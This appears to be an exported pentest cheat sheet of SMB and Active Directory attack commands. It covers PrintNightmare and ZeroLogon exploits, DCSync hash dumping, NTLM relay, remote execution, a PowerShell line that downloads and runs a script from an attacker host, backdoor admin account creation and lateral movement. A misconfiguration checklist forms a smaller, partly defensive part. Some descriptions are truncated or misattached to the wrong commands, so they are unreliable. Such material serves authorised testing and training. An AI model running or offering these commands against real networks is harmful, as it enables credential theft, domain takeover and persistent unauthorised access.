<!-- cmd: {"id":"2orvuqkhhmpmy5ipf","language":"bash","sectionId":"x69zzuidempmy5if9","tags":["eternalblue","ms17-010","metasploit"]} -->

### 5jpxucnyvmpmy5ipi
```bash
nxc smb $TARGET -u $USER -p $PASS -M printnightmare
python3 CVE-2021-1675.py $DOMAIN/$USER:$PASS@$TARGET '\\\\$ATTACKER_IP\\share\\driver.dll'
```

_Tags: #eternalblue, #ms17-010, #metasploit Check for PrintNightmare (CVE-2021-34527) — remote code execution via printer driver installation._

**Tags:** printnightmare, cve-2021-34527, rce, vuln
<!-- cmd: {"id":"5jpxucnyvmpmy5ipi","language":"bash","sectionId":"x69zzuidempmy5if9","tags":["printnightmare","cve-2021-34527","rce","vuln"]} -->

### 22q5elnovmpmy5ipl
```bash
python3 zerologon_tester.py $NETBIOS_NAME $DC
nxc smb $DC -u '' -p '' -M zerologon
```

_tester.py $NETBIOS_

**Tags:** zerologon, cve-2020-1472, critical, vuln
<!-- cmd: {"id":"22q5elnovmpmy5ipl","language":"bash","sectionId":"x69zzuidempmy5if9","tags":["zerologon","cve-2020-1472","critical","vuln"]} -->

### eti8hvgp6mpmy5ipp
```bash
python3 zerologon.py $NETBIOS_NAME $DC
secretsdump.py -no-pass $NETBIOS_NAME\$@$DC
```

_Tags: #zerologon, #cve-2020-1472, #critical, #vuln Exploit ZeroLogon to reset machine account password and dump credentials._

**Tags:** zerologon, exploit, dcsync, credential-access
<!-- cmd: {"id":"eti8hvgp6mpmy5ipp","language":"bash","sectionId":"x69zzuidempmy5if9","tags":["zerologon","exploit","dcsync","credential-access"]} -->

### 85fino9mampmy5ips
```bash
nmap -p 445 --script smb-protocols $TARGET | grep -i "SMBv1"
nxc smb $TARGET -u '' -p '' --shares 2>&1 | grep -i "SMBv1"
```

_Tags: #zerologon, #exploit, #dcsync, #credential-access Check for SMBv1 support (Highly vulnerable)._

**Tags:** misconfiguration, smbv1, nmap
<!-- cmd: {"id":"85fino9mampmy5ips","language":"bash","sectionId":"x69zzuidempmy5if9","tags":["misconfiguration","smbv1","nmap"]} -->

## DCSync Attack
<!-- section: {"id":"epekp58uhmpmy5ifc","order":16,"collapsed":false} -->

### 3wgzq4imjmpmy5iq0
```bash
secretsdump.py -just-dc $DOMAIN/$USER:$PASS@$DC
secretsdump.py -just-dc-ntlm $DOMAIN/$USER:$PASS@$DC
```

_DCSync Attack DCSync — extract all password hashes from a Domain Controller by abusing DRSUAPI over SMB. Requires Replication-Get-Changes-All privilege._

**Tags:** dcsync, drsuapi, credential-access, domainadmin, secretsdump
<!-- cmd: {"id":"3wgzq4imjmpmy5iq0","language":"bash","sectionId":"epekp58uhmpmy5ifc","tags":["dcsync","drsuapi","credential-access","domainadmin","secretsdump"]} -->

### bzbykub4qmpmy5iq4
```bash
secretsdump.py -just-dc -hashes :$HASH $DOMAIN/$USER@$DC
```

_Tags: #dcsync, #drsuapi, #credential-access, #domainadmin, #secretsdump DCSync using Pass-the-Hash._

**Tags:** dcsync, pth, credential-access, secretsdump
<!-- cmd: {"id":"bzbykub4qmpmy5iq4","language":"bash","sectionId":"epekp58uhmpmy5ifc","tags":["dcsync","pth","credential-access","secretsdump"]} -->

### 913vwvxb5mpmy5iq7
```bash
secretsdump.py -just-dc $DOMAIN/$USER:$PASS@$DC -user $TARGET_USER
```

_Tags: #dcsync, #pth, #credential-access, #secretsdump DCSync targeting specific user only._

**Tags:** dcsync, targeted, credential-access, secretsdump
<!-- cmd: {"id":"913vwvxb5mpmy5iq7","language":"bash","sectionId":"epekp58uhmpmy5ifc","tags":["dcsync","targeted","credential-access","secretsdump"]} -->

## Coercion & NTLM Relay
<!-- section: {"id":"xl8m9figgmpmy5iff","order":17,"collapsed":false} -->

### go6reqobtmpmy5iqf
```bash
coercer scan -u $USER -p $PASS -t $TARGET -l $ATTACKER_IP
```

_Coercion & NTLM Relay Identify SMB coercion vectors (PetitPotam, PrinterBug, etc.)._

**Tags:** coercion, coercer, ntlm
<!-- cmd: {"id":"go6reqobtmpmy5iqf","language":"bash","sectionId":"xl8m9figgmpmy5iff","tags":["coercion","coercer","ntlm"]} -->

### ondmb2ytsmpmy5iqj
```bash
responder -I eth0 -dwPv
```

_Tags: #coercion, #coercer, #ntlm Capture NTLMv2 hashes via LLMNR/NBT-NS/mDNS poisoning._

**Tags:** responder, capture, ntlmv2
<!-- cmd: {"id":"ondmb2ytsmpmy5iqj","language":"bash","sectionId":"xl8m9figgmpmy5iff","tags":["responder","capture","ntlmv2"]} -->

### qfcpyrqn8mpmy5iql
```bash
mitm6 -i eth0 -d $DOMAIN
```

_Tags: #responder, #capture, #ntlmv2 IPv6 DNS takeover for NTLM capture._

**Tags:** mitm6, ipv6, capture
<!-- cmd: {"id":"qfcpyrqn8mpmy5iql","language":"bash","sectionId":"xl8m9figgmpmy5iff","tags":["mitm6","ipv6","capture"]} -->

### 26i5nm9qlmpmy5iqo
```bash
python3 petitpotam.py $ATTACKER_IP $TARGET
```

_Tags: #mitm6, #ipv6, #capture Trigger PetitPotam coercion to force machine account authentication._

**Tags:** petitpotam, coercion, rpc
<!-- cmd: {"id":"26i5nm9qlmpmy5iqo","language":"bash","sectionId":"xl8m9figgmpmy5iff","tags":["petitpotam","coercion","rpc"]} -->

### gz7bvgjdampmy5iqs
```bash
python3 printerbug.py $DOMAIN/$USER:$PASS@$TARGET $ATTACKER_IP
```

_Tags: #petitpotam, #coercion, #rpc Trigger PrinterBug (MS-RPRN) coercion to force machine account authentication._

**Tags:** printerbug, coercion, ms-rprn
<!-- cmd: {"id":"gz7bvgjdampmy5iqs","language":"bash","sectionId":"xl8m9figgmpmy5iff","tags":["printerbug","coercion","ms-rprn"]} -->

### vupe2t033mpmy5iqv
```bash
impacket-ntlmrelayx -t ldap://$DC --escalate-user $USER --no-smb-server
```

_Tags: #printerbug, #coercion, #ms-rprn Relay captured SMB authentication to LDAP to create a new admin user._

**Tags:** relay, ntlmrelayx, ldap, adcs
<!-- cmd: {"id":"vupe2t033mpmy5iqv","language":"bash","sectionId":"xl8m9figgmpmy5iff","tags":["relay","ntlmrelayx","ldap","adcs"]} -->

### 7w8386glgmpmy5iqy
```bash
impacket-ntlmrelayx -t ldaps://$DC --shadow-credentials --shadow-target "$TARGET_MACHINE$"
```

_Tags: #relay, #ntlmrelayx, #ldap, #adcs Relay to LDAPS with Shadow Credentials write (persist via certificate)._

**Tags:** relay, ntlmrelayx, ldaps, shadow-credentials, ad-abuse
<!-- cmd: {"id":"7w8386glgmpmy5iqy","language":"bash","sectionId":"xl8m9figgmpmy5iff","tags":["relay","ntlmrelayx","ldaps","shadow-credentials","ad-abuse"]} -->

### qs8s1gdcvmpmy5ir1
```bash
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "whoami"
```

_Tags: #relay, #ntlmrelayx, #ldaps, #shadow-credentials, #ad-abuse Relay SMB to SMB (requires disabled SMB signing on target)._

**Tags:** relay, ntlmrelayx, smb
<!-- cmd: {"id":"qs8s1gdcvmpmy5ir1","language":"bash","sectionId":"xl8m9figgmpmy5iff","tags":["relay","ntlmrelayx","smb"]} -->

### m0mepsj3hmpmy5ir5
```bash
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks
```

_Tags: #relay, #ntlmrelayx, #smb Multi-protocol relay with SOCKS proxy for pivoting._

**Tags:** relay, ntlmrelayx, socks, pivoting
<!-- cmd: {"id":"m0mepsj3hmpmy5ir5","language":"bash","sectionId":"xl8m9figgmpmy5iff","tags":["relay","ntlmrelayx","socks","pivoting"]} -->

## Delegation Attacks (SMB Context)
<!-- section: {"id":"19l7oqpqxmpmy5ifj","order":18,"collapsed":false} -->

### rrncqhko6mpmy5irp
```bash
nxc ldap $DC -u $USER -p $PASS --trusted-for-delegation
nxc smb $TARGET -u $USER -p $PASS --delegation
```

_Delegation Attacks (SMB Context) Check for unconstrained delegation on machines (high value targets)._

**Tags:** delegation, unconstrained, misconfiguration, nxc
<!-- cmd: {"id":"rrncqhko6mpmy5irp","language":"bash","sectionId":"19l7oqpqxmpmy5ifj","tags":["delegation","unconstrained","misconfiguration","nxc"]} -->

### m62obbbo5mpmy5irs
```bash
nxc ldap $DC -u $USER -p $PASS --delegate
findDelegation.py -d $DOMAIN -u $USER -p $PASS -dc-ip $DC
```

_Tags: #delegation, #unconstrained, #misconfiguration, #nxc Find constrained delegation targets and identify exploitable services._

**Tags:** delegation, constrained, ad-abuse, nxc, impacket
<!-- cmd: {"id":"m62obbbo5mpmy5irs","language":"bash","sectionId":"19l7oqpqxmpmy5ifj","tags":["delegation","constrained","ad-abuse","nxc","impacket"]} -->

### fyi7wx7p6mpmy5irx
```bash
getST.py -spn cifs/$TARGET -impersonate Administrator $DOMAIN/$USER -hashes :$HASH -dc-ip $DC
KRB5CCNAME=Administrator.ccache nxc smb $TARGET -u Administrator --use-kcache
```

_Tags: #delegation, #constrained, #ad-abuse, #nxc, #impacket Exploit constrained delegation with S4U to impersonate another user._

**Tags:** delegation, s4u, constrained, privilege-escalation, impacket
<!-- cmd: {"id":"fyi7wx7p6mpmy5irx","language":"bash","sectionId":"19l7oqpqxmpmy5ifj","tags":["delegation","s4u","constrained","privilege-escalation","impacket"]} -->

## Remote Command Execution (RCE)
<!-- section: {"id":"jvvpkbua5mpmy5ifl","order":19,"collapsed":false} -->

### 3jep0xtdfmpmy5is8
```bash
impacket-psexec $DOMAIN/$USER:$PASS@$TARGET
```

_Remote Command Execution (RCE) Execute commands via SMB (PsExec method)._

**Tags:** psexec, rce, impacket
<!-- cmd: {"id":"3jep0xtdfmpmy5is8","language":"bash","sectionId":"jvvpkbua5mpmy5ifl","tags":["psexec","rce","impacket"]} -->

### r21b3fb4cmpmy5isb
```bash
impacket-wmiexec $DOMAIN/$USER:$PASS@$TARGET
```

_Tags: #psexec, #rce, #impacket Execute commands via WMI over SMB._

**Tags:** wmiexec, rce, impacket
<!-- cmd: {"id":"r21b3fb4cmpmy5isb","language":"bash","sectionId":"jvvpkbua5mpmy5ifl","tags":["wmiexec","rce","impacket"]} -->

### pfrxd2ilgmpmy5isf
```bash
impacket-atexec $DOMAIN/$USER:$PASS@$TARGET "cmd.exe /c whoami"
```

_Tags: #wmiexec, #rce, #impacket Execute commands via Scheduled Tasks (AtExec)._

**Tags:** atexec, rce, impacket
<!-- cmd: {"id":"pfrxd2ilgmpmy5isf","language":"bash","sectionId":"jvvpkbua5mpmy5ifl","tags":["atexec","rce","impacket"]} -->

### sukjlmp7lmpmy5isi
```bash
impacket-dcomexec $DOMAIN/$USER:$PASS@$TARGET
```

_Tags: #atexec, #rce, #impacket Execute commands via MMC20.Application over DCOM._

**Tags:** dcomexec, rce, impacket
<!-- cmd: {"id":"sukjlmp7lmpmy5isi","language":"bash","sectionId":"jvvpkbua5mpmy5ifl","tags":["dcomexec","rce","impacket"]} -->

### tyl4uu1kwmpmy5ism
```bash
nxc smb $TARGET -u $USER -p $PASS -x "whoami" --exec-method smbexec
```

_Tags: #dcomexec, #rce, #impacket Remote execution using NetExec (specify method if needed)._

**Tags:** nxc, rce, smbexec
<!-- cmd: {"id":"tyl4uu1kwmpmy5ism","language":"bash","sectionId":"jvvpkbua5mpmy5ifl","tags":["nxc","rce","smbexec"]} -->

### d7gy54sbsmpmy5isp
```bash
evil-winrm -i $TARGET -u $USER -p $PASS
```

_Tags: #nxc, #rce, #smbexec PowerShell Remoting via WinRM (often enabled alongside SMB)._

**Tags:** winrm, shell, evil-winrm
<!-- cmd: {"id":"d7gy54sbsmpmy5isp","language":"bash","sectionId":"jvvpkbua5mpmy5ifl","tags":["winrm","shell","evil-winrm"]} -->

### rh63i5rb5mpmy5iss
```bash
nxc smb $TARGET -u $USER -p $PASS -X "IEX(New-Object Net.WebClient).DownloadString('http://$ATTACKER_IP/ps.ps1')"
```

_Tags: #winrm, #shell, #evil-winrm Execute PowerShell script via NetExec with in-memory execution._

**Tags:** rce, powershell, nxc, in-memory
<!-- cmd: {"id":"rh63i5rb5mpmy5iss","language":"bash","sectionId":"jvvpkbua5mpmy5ifl","tags":["rce","powershell","nxc","in-memory"]} -->

## Active Directory Abuse (SMB Context)
<!-- section: {"id":"9qu6nd7c5mpmy5ifp","order":20,"collapsed":false} -->

### 76sxpm9e9mpmy5it2
```bash
bloodhound-python -u $USER -p $PASS -d $DOMAIN -ns $DC -c All --zip
bloodhound-python -u $USER --hashes $HASH -d $DOMAIN -ns $DC -c All --zip
```

_Active Directory Abuse (SMB Context) Collect AD data for BloodHound via SMB/RPC._

**Tags:** bloodhound, ad, enumeration
<!-- cmd: {"id":"76sxpm9e9mpmy5it2","language":"bash","sectionId":"9qu6nd7c5mpmy5ifp","tags":["bloodhound","ad","enumeration"]} -->

### i4ubitsr3mpmy5it6
```bash
bloodhound-python -u $USER -p $PASS -d $DOMAIN -ns $DC -c DCOnly --zip
```

_Tags: #bloodhound, #ad, #enumeration DCOnly collection for faster BloodHound data gathering without computer sessions._

**Tags:** bloodhound, dconly, fast-enum
<!-- cmd: {"id":"i4ubitsr3mpmy5it6","language":"bash","sectionId":"9qu6nd7c5mpmy5ifp","tags":["bloodhound","dconly","fast-enum"]} -->

### 8rdv30fo1mpmy5it9
```bash
bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC set password $TARGET_USER 'NewPassword123!'
```

_Tags: #bloodhound, #dconly, #fast-enum Change user password via LDAP/SMB using bloodyAD._

**Tags:** bloodyAD, passwordchange, ad
<!-- cmd: {"id":"8rdv30fo1mpmy5it9","language":"bash","sectionId":"9qu6nd7c5mpmy5ifp","tags":["bloodyAD","passwordchange","ad"]} -->

## Credential Access & Post Exploitation
<!-- section: {"id":"i8ux2gpa4mpmy5ifs","order":21,"collapsed":false} -->

### 05nc06vfcmpmy5iti
```bash
secretsdump.py $DOMAIN/$USER:$PASS@$TARGET
```

_Credential Access & Post Exploitation Dump SAM, LSA, and NTDS hashes remotely._

**Tags:** hashdump, credentials, secretsdump
<!-- cmd: {"id":"05nc06vfcmpmy5iti","language":"bash","sectionId":"i8ux2gpa4mpmy5ifs","tags":["hashdump","credentials","secretsdump"]} -->

### ehz266tvjmpmy5itl
```bash
nxc smb $TARGET -u $USER -p $PASS --sam
```

_Tags: #hashdump, #credentials, #secretsdump Dump SAM database via NetExec._

**Tags:** sam, hashes, nxc
<!-- cmd: {"id":"ehz266tvjmpmy5itl","language":"bash","sectionId":"i8ux2gpa4mpmy5ifs","tags":["sam","hashes","nxc"]} -->

### 55keexo5kmpmy5ito
```bash
nxc smb $TARGET -u $USER -p $PASS --lsa
```

_Tags: #sam, #hashes, #nxc Dump LSA secrets via NetExec._

**Tags:** lsa, secrets, nxc
<!-- cmd: {"id":"55keexo5kmpmy5ito","language":"bash","sectionId":"i8ux2gpa4mpmy5ifs","tags":["lsa","secrets","nxc"]} -->

### 1e7bs1qa6mpmy5its
```bash
nxc smb $TARGET -u $USER -p $PASS --dpapi
```

_Tags: #lsa, #secrets, #nxc Dump DPAPI master keys and credentials._

**Tags:** dpapi, credentials, nxc
<!-- cmd: {"id":"1e7bs1qa6mpmy5its","language":"bash","sectionId":"i8ux2gpa4mpmy5ifs","tags":["dpapi","credentials","nxc"]} -->

### 8d1b82btzmpmy5itw
```bash
nxc smb $DC -u $USER -p $PASS --ntds
```

_Tags: #dpapi, #credentials, #nxc Dump NTDS.dit via DRSUAPI (Domain Controller only)._

**Tags:** ntds, domainadmin, nxc
<!-- cmd: {"id":"8d1b82btzmpmy5itw","language":"bash","sectionId":"i8ux2gpa4mpmy5ifs","tags":["ntds","domainadmin","nxc"]} -->

### 5j428ps89mpmy5itz
```bash
nxc smb $DC -u $USER -p $PASS --ntds --enabled --user-status
```

_Tags: #ntds, #domainadmin, #nxc Dump NTDS.dit with user info for offline analysis._

**Tags:** ntds, domainadmin, nxc, detailed
<!-- cmd: {"id":"5j428ps89mpmy5itz","language":"bash","sectionId":"i8ux2gpa4mpmy5ifs","tags":["ntds","domainadmin","nxc","detailed"]} -->

### wllgaord7mpmy5iu2
```bash
impacket-reg $DOMAIN/$USER:$PASS@$TARGET backup -o /tmp/
```

_Tags: #ntds, #domainadmin, #nxc, #detailed Remote registry backup for offline SAM/SYSTEM parsing._

**Tags:** registry, sam, impacket
<!-- cmd: {"id":"wllgaord7mpmy5iu2","language":"bash","sectionId":"i8ux2gpa4mpmy5ifs","tags":["registry","sam","impacket"]} -->

### q5a5a7pf1mpmy5iu5
```bash
impacket-reg $DOMAIN/$USER:$PASS@$TARGET query -keyName "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
impacket-reg $DOMAIN/$USER:$PASS@$TARGET query -keyName "HKLM\SOFTWARE" -s
```

_Tags: #registry, #sam, #impacket Query remote registry for installed software and run keys._

**Tags:** registry, enumeration, impacket, persistence
<!-- cmd: {"id":"q5a5a7pf1mpmy5iu5","language":"bash","sectionId":"i8ux2gpa4mpmy5ifs","tags":["registry","enumeration","impacket","persistence"]} -->

### nsbef88ldmpmy5iu9
```bash
nxc smb $TARGET -u $USER -p $PASS -x "netsh wlan show profiles" 
nxc smb $TARGET -u $USER -p $PASS -x "netsh wlan show profile name=\"WiFiName\" key=clear"
```

_Tags: #registry, #enumeration, #impacket, #persistence Extract saved WiFi credentials via SMB remote registry._

**Tags:** wifi, credentials, post-exploitation, nxc
<!-- cmd: {"id":"nsbef88ldmpmy5iu9","language":"bash","sectionId":"i8ux2gpa4mpmy5ifs","tags":["wifi","credentials","post-exploitation","nxc"]} -->

## Persistence
<!-- section: {"id":"6ur0f0qx7mpmy5ifv","order":22,"collapsed":false} -->

### n7abm9dmumpmy5ius
```bash
impacket-services.py $DOMAIN/$USER:$PASS@$TARGET create -name 'SysUpdate' -display 'System Update' -path 'C:\Windows\System32\cmd.exe /c powershell -e <base64>'
```

_Persistence Create a malicious service for persistence._

**Tags:** persistence, services, impacket
<!-- cmd: {"id":"n7abm9dmumpmy5ius","language":"bash","sectionId":"6ur0f0qx7mpmy5ifv","tags":["persistence","services","impacket"]} -->

### dx8katldempmy5iuw
```bash
impacket-services.py $DOMAIN/$USER:$PASS@$TARGET start -name 'SysUpdate'
```

_Tags: #persistence, #services, #impacket Start the created malicious service._

**Tags:** persistence, services, impacket
<!-- cmd: {"id":"dx8katldempmy5iuw","language":"bash","sectionId":"6ur0f0qx7mpmy5ifv","tags":["persistence","services","impacket"]} -->

### gsrj3b0gbmpmy5iuz
```bash
nxc smb $TARGET -u $USER -p $PASS -M schtask_as -o USER=$TARGET_USER CMD="C:\Windows\System32\calc.exe"
```

_as -o USER=$TARGET_

**Tags:** persistence, schtask, nxc
<!-- cmd: {"id":"gsrj3b0gbmpmy5iuz","language":"bash","sectionId":"6ur0f0qx7mpmy5ifv","tags":["persistence","schtask","nxc"]} -->

### 02p2vhgocmpmy5iv3
```bash
nxc smb $TARGET -u $USER -p $PASS -x "net user backdoor P@ssw0rd123! /add && net localgroup administrators backdoor /add"
```

_Tags: #persistence, #schtask, #nxc Add a new local admin account for persistent access._

**Tags:** persistence, localadmin, backdoor, nxc
<!-- cmd: {"id":"02p2vhgocmpmy5iv3","language":"bash","sectionId":"6ur0f0qx7mpmy5ifv","tags":["persistence","localadmin","backdoor","nxc"]} -->

## Lateral Movement
<!-- section: {"id":"17evka9p1mpmy5ifx","order":23,"collapsed":false} -->

### 2na7vjviampmy5ivc
```bash
nxc smb targets.txt -u $USER -p $PASS --local-auth
```

_Lateral Movement Pass credentials to multiple hosts to find local admin access._

**Tags:** lateralmovement, localadmin, nxc
<!-- cmd: {"id":"2na7vjviampmy5ivc","language":"bash","sectionId":"17evka9p1mpmy5ifx","tags":["lateralmovement","localadmin","nxc"]} -->

### qn4h7clxumpmy5ivg
```bash
nxc smb targets.txt -u $USER -H $HASH
```

_Tags: #lateralmovement, #localadmin, #nxc Pass the Hash to multiple hosts._

**Tags:** lateralmovement, pth, nxc
<!-- cmd: {"id":"qn4h7clxumpmy5ivg","language":"bash","sectionId":"17evka9p1mpmy5ifx","tags":["lateralmovement","pth","nxc"]} -->

### nyxten1pcmpmy5ivj
```bash
nxc smb targets.txt -u $USER -p $PASS -x "net user backdoor Password123! /add && net localgroup administrators backdoor /add"
```

_Tags: #lateralmovement, #pth, #nxc Execute payload across multiple compromised hosts._

**Tags:** lateralmovement, rce, backdoor
<!-- cmd: {"id":"nyxten1pcmpmy5ivj","language":"bash","sectionId":"17evka9p1mpmy5ifx","tags":["lateralmovement","rce","backdoor"]} -->

### jelfe9lo7mpmy5ivn
```bash
impacket-wmiexec $DOMAIN/$USER:$PASS@$TARGET
```

_Tags: #lateralmovement, #rce, #backdoor Lateral movement via WMI event subscription (stealthier alternative)._

**Tags:** lateralmovement, wmi, stealth, impacket
<!-- cmd: {"id":"jelfe9lo7mpmy5ivn","language":"bash","sectionId":"17evka9p1mpmy5ifx","tags":["lateralmovement","wmi","stealth","impacket"]} -->

## Common Misconfigurations
<!-- section: {"id":"iyi1ue28bmpmy5ig1","order":24,"collapsed":false} -->

### qab2d64zlmpmy5iw0
```bash
nmap -p 445 --script smb-protocols $TARGET | grep -i "SMBv1"
```

_Common Misconfigurations Check for SMBv1 support (Highly vulnerable)._

**Tags:** misconfiguration, smbv1, nmap
<!-- cmd: {"id":"qab2d64zlmpmy5iw0","language":"bash","sectionId":"iyi1ue28bmpmy5ig1","tags":["misconfiguration","smbv1","nmap"]} -->

### gik1e0tyempmy5iw3
```bash
smbmap -H $TARGET -u $USER -p $PASS | grep -i "READ, WRITE"
```

_Tags: #misconfiguration, #smbv1, #nmap List shares with READ/WRITE access for low-privileged users._

**Tags:** misconfiguration, shares, permissions
<!-- cmd: {"id":"gik1e0tyempmy5iw3","language":"bash","sectionId":"iyi1ue28bmpmy5ig1","tags":["misconfiguration","shares","permissions"]} -->

### 2tvr6fbk7mpmy5iw7
```bash
nxc ldap $DC -u $USER -p $PASS --unconstrained
```

_Tags: #misconfiguration, #shares, #permissions Check for Unconstrained Delegation on machine accounts (via BloodHound or LDAP)._

**Tags:** misconfiguration, unconstrained, delegation, nxc
<!-- cmd: {"id":"2tvr6fbk7mpmy5iw7","language":"bash","sectionId":"iyi1ue28bmpmy5ig1","tags":["misconfiguration","unconstrained","delegation","nxc"]} -->

### 1s72hm1tlmpmy5iwa
```bash
nxc smb $TARGET -u '' -p '' --gen-relay-list relay_targets.txt
nmap -p 445 --script smb2-security-mode $TARGET
```

_Tags: #misconfiguration, #unconstrained, #delegation, #nxc Check if SMB signing is required (if not, relay attacks are possible)._

**Tags:** misconfiguration, signing, relay
<!-- cmd: {"id":"1s72hm1tlmpmy5iwa","language":"bash","sectionId":"iyi1ue28bmpmy5ig1","tags":["misconfiguration","signing","relay"]} -->

### 6xl4roipzmpmy5iwe
```bash
smbclient //$DC/SYSVOL -N 2>/dev/null && echo "ANONYMOUS SYSVOL ACCESS"
smbclient //$DC/NETLOGON -N 2>/dev/null && echo "ANONYMOUS NETLOGON ACCESS"
```

_Tags: #misconfiguration, #signing, #relay Check for anonymous access to SYSVOL/NETLOGON shares._

**Tags:** misconfiguration, sysvol, anonymous, shares
<!-- cmd: {"id":"6xl4roipzmpmy5iwe","language":"bash","sectionId":"iyi1ue28bmpmy5ig1","tags":["misconfiguration","sysvol","anonymous","shares"]} -->

### dlu22uv8jmpmy5iwg
```bash
nxc ldap $DC -u $USER -p $PASS -M get-desc-users
```

_Tags: #misconfiguration, #sysvol, #anonymous, #shares Check for users with passwords in description field._

**Tags:** misconfiguration, passwords-in-description, nxc
<!-- cmd: {"id":"dlu22uv8jmpmy5iwg","language":"bash","sectionId":"iyi1ue28bmpmy5ig1","tags":["misconfiguration","passwords-in-description","nxc"]} -->

## Misconfigurations Checklist
<!-- section: {"id":"0i1rn4fdqmpmy5ig4","order":25,"collapsed":false} -->

### qrutai3n8mpmy5iwz
```bash
# 1. SMB signing not required (relay attack surface)
nxc smb $TARGET -u '' -p '' --gen-relay-list relay_targets.txt

# 2. SMBv1 enabled
nmap -p 445 --script smb-protocols $TARGET | grep -i "SMBv1"

# 3. Null session access
nxc smb $TARGET -u '' -p '' --shares

# 4. Guest access
nxc smb $TARGET -u 'guest' -p '' --shares

# 5. Anonymous SYSVOL/NETLOGON access
smbclient //$DC/SYSVOL -N -c 'ls' 2>/dev/null

# 6. Users with passwords in description
nxc ldap $DC -u $USER -p $PASS -M get-desc-users

# 7. LAPS readable
nxc ldap $DC -u $USER -p $PASS -M laps

# 8. Unconstrained delegation
nxc ldap $DC -u $USER -p $PASS --trusted-for-delegation

# 9. ASREPRoastable users
nxc ldap $DC -u $USER -p $PASS --asreproast /dev/stdout

# 10. Kerberoastable accounts
nxc ldap $DC -u $USER -p $PASS --kerberoasting /dev/stdout

# 11. Writable shares
smbmap -H $TARGET -u $USER -p $PASS | grep -i "READ, WRITE"

# 12. gMSA readable
nxc ldap $DC -u $USER -p $PASS --gmsa

# 13. EternalBlue vulnerable
nxc smb $TARGET -u '' -p '' -M ms17-010

# 14. PrintNightmare
nxc smb $TARGET -u $USER -p $PASS -M printnightmare

# 15. ZeroLogon
nxc smb $DC -u '' -p '' -M zerologon

# 16. SMB encryption not enforced
nxc smb $TARGET -u '' -p '' --shares 2>/dev/null | grep -i encrypt
```

_Misconfigurations Checklist Quick automated check for all critical SMB-related misconfigurations._

**Tags:** misconfiguration, checklist, signing, smbv1, nullsession, laps, delegation, eternalblue, printnightmare, zerologon
<!-- cmd: {"id":"qrutai3n8mpmy5iwz","language":"bash","sectionId":"0i1rn4fdqmpmy5ig4","tags":["misconfiguration","checklist","signing","smbv1","nullsession","laps","delegation","eternalblue","printnightmare","zerologon"]} -->

## Quick Wins — Post-Exploitation One-Liners
<!-- section: {"id":"f6sn6mxsnmpmy5ig7","order":26,"collapsed":false} -->

### j9esjm2znmpmy5ix9
```bash
# All shares with null session
nxc smb $TARGET -u '' -p '' --shares 2>/dev/null

# Domain Admins members fast
nxc ldap $DC -u $USER -p $PASS --groups "Domain Admins"

# All logged-on users
nxc smb $TARGET -u $USER -p $PASS --loggedon-users

# Password policy (avoid lockouts)
nxc smb $TARGET -u $USER -p $PASS --pass-pol

# Quick SAM dump
nxc smb $TARGET -u $USER -p $PASS --sam

# Full recon combo: BloodHound + ldapdomaindump
bloodhound-python -u $USER -p $PASS -d $DOMAIN -ns $DC -c All --zip && \
  ldapdomaindump -u "$DOMAIN\\$USER" -p "$PASS" ldap://$DC -o ./ldap_dump/

# All writable attributes for current user
bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC get writable 2>/dev/null | grep -v "^$"

# Find all shares across subnet with credentials
nxc smb targets.txt -u $USER -p $PASS --shares 2>/dev/null | grep -E "READ|WRITE"

# Quick Kerberoast
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC -request 2>/dev/null

# Quick ASREPRoast
impacket-GetNPUsers $DOMAIN/$USER:$PASS -dc-ip $DC -request 2>/dev/null

# Check for GPP passwords in SYSVOL
smbclient //$DC/SYSVOL -U $DOMAIN/$USER%$PASS -c 'prompt OFF; recurse ON; cd $DOMAIN\Policies; mget Groups.xml Services.xml ScheduledTasks.xml' 2>/dev/null

# SCCM / MECM objects
ldapsearch -x -H ldap://$DC -D "$USER@$DOMAIN" -w "$PASS" \
  -b "DC=$DOMAIN,DC=local" "(objectClass=mSSMSManagementPoint)" \
  dNSHostName mSSMSSiteCode
```

_Quick Wins — Post-Exploitation One-Liners Fast post-compromise recon commands for quick wins._

**Tags:** post-exploitation, one-liners, quick-wins, enum, bloodhound, sccm
<!-- cmd: {"id":"j9esjm2znmpmy5ix9","language":"bash","sectionId":"f6sn6mxsnmpmy5ig7","tags":["post-exploitation","one-liners","quick-wins","enum","bloodhound","sccm"]} -->

## SMB Traffic Capture
<!-- section: {"id":"l4rs4ji8umpmy5iga","order":27,"collapsed":false} -->

### riyy64ie8mpmy5ixk
```bash
# Capture SMB traffic on interface
tcpdump -i eth0 -w smb_capture.pcap 'port 445 or port 139'

# Filter SMB1 traffic
tshark -r smb_capture.pcap -Y 'smb'

# Filter SMB2/3 traffic
tshark -r smb_capture.pcap -Y 'smb2'

# Extract NTLM authentication hashes from capture
tshark -r smb_capture.pcap -Y 'ntlmssp' -T fields -e ntlmssp.msv_av_dns_computer_name
```

_capture.pcap -Y 'ntlmssp' -T fields -e ntlmssp.msv_

**Tags:** wireshark, capture, traffic-analysis, pcap
<!-- cmd: {"id":"riyy64ie8mpmy5ixk","language":"bash","sectionId":"l4rs4ji8umpmy5iga","tags":["wireshark","capture","traffic-analysis","pcap"]} -->
